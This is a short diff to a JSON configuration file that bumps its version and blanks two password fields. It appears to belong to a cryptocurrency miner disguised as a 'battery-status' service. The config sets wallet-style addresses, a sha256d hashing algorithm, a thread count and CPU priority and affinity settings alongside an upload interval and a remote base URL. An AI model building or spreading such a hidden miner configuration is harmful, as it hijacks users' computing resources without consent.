@@ -1,5 +1,5 @@
 {
-  "version": "0.0.34",
+  "version": "0.0.35",
   "script": "",
   "uploadingIntervel": 10,
   "baseUrl": "https://battery-status.onrender.com",
@@ -70,8 +70,8 @@
     "user": "RB6WupzbH6nzcPt9mNrEKT86T2dtHdHVGW",
     "algo1": "sha256d",
     "user1": "12pKqK7JgGzRYPWxJCs7DvntgmBHaQwomt",
-    "pass": "x",
-    "password": "x",
+    "pass": "",
+    "password": "",
     "threads": 8,
     "cpu-priority": 1,
     "cpu-affinity": -1,
